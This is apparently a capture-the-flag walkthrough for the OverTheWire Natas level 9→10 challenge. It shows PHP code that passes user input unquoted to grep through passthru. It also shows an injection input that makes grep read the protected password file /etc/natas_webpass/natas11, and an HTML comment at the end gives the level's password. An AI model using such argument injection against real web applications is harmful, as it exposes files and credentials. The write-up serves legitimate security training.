Let's dive into the next level using the credentials obtained from the previous stage and explore what's happening under the hood.

![untitled](ScreenShots/Level%209%20->%2010.jpg)

In this level, we observe that the input entered is first filtered and then executed to retrieve the password. Here is the source code responsible for this process:
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
From the code, it's clear that the input is sanitized to prevent injection attacks using characters such as `;`, `|`, and `&`. However, similar to the previous level, we can bypass this restriction by manipulating the destination file.

To exploit this, we can use the following command:
```bash
grep -i ". /etc/natas_webpass/natas11 #" dictionary.txt
```
Executing this command allows us to view the password for the next level by tricking the `grep` command into reading the sensitive file.

Armed with the retrieved password, we can proceed to the next level using the following credentials:
```
URL: http://natas11.natas.labs.overthewire.org
Username: natas11
Password: Password obtained via the bash injection exploit
```
<!-- Password: `1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg` -->